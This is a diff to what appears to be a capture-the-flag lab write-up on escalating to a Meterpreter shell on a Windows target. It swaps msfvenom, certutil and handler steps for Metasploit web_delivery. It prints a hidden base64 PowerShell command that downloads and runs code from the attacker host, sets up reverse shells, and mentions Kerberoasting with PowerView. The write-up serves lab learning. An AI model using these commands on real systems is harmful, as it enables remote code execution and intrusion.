@@ -63,35 +63,29 @@ cat c:\users\administrator\desktop\flag.txt
 
 We will have to elevate our privileges and get a proper shell on the target, lets do so using Meterpreter 
 
-## 1. Create a PAYLOAD using MSFVenom
-
+We will use the ***web_delivery*** exploit
+## Use Metasploit 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.117 LPORT=4444 -f psh -o payload.ps1
+msfconsole -q 
+search web_delivery
+use exploit/multi/script/web_delivery 
 ```
-## 2. Transfer the Payload to the target (certutil)
-
-```bash
-certutil.exe -urlcache -f http://10.10.14.117:8080/payload.ps1 payload.ps1
+### Set the options
 ```
-## 3. Setup Listener 
-
-```bash
-msf6 > use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD => windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 10.10.14.117
-LHOST => 10.10.14.117
-msf6 exploit(multi/handler) > set LPORT 7777
-LPORT => 7777
-msf6 exploit(multi/handler) > run
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST PWNIP
+set SRVHOST PWNIP
+set TARGET 2 
+exploit
+```
+### Copy the payload to the target webserver's shell
+```
+[*] Run the following command on the target machine:
+powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABlADEAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZQAxAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZQAxAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAxADcAOgA4ADAAOAAwAC8AWAB1AGEARQBmAHAAQwBDAGIAcAAzAHgAUQA1AC8AMwBoADAATQBqADUAeABuAEcAUABuAEYAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMQA3ADoAOAAwADgAMAAvAFgAdQBhAEUAZgBwAEMAQwBiAHAAMwB4AFEANQAnACkAKQA7AA==
 
 ```
-## 4. Execute the Payload on the Target
+### Shell Obtained in Meterpreter
 
-
-
-For this we will have to Kerberoast the accounts, lets try and use either PowerView or Rubeus 
 
 ## Download PowerView or Host
 I already have it on my machine, but it can be downloaded here; [PowerTools/PowerView/powerview.ps1 at master · PowerShellEmpire/PowerTools · GitHub](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
